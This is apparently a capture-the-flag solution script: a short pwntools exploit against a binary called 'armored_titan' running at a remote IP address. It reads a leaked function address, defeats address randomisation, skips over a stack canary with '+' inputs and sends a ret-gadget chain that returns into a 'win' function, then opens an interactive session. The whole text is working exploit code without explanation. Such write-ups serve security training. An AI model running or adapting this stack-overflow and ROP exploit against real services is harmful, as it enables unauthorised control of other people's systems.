from pwn import *
elf = context.binary = ELF('./armored_titan')
r = remote('34.47.134.251',5006)
# gdb.attach(r)
r.recvuntil(b'room key: ')
win = int(r.recvline()[:-1].decode(),16)
elf.address = win - elf.sym.escape
r.sendline(b'16')
for i in range(8):
    r.sendline(b'1234')
r.sendline(b'+')
r.sendline(b'+')
r.sendline(b'+')
rop = ROP(elf)
ret = rop.ret[0]
for i in range(3):
    r.sendline(str(ret).encode())
    r.sendline(str(win).encode())

r.interactive()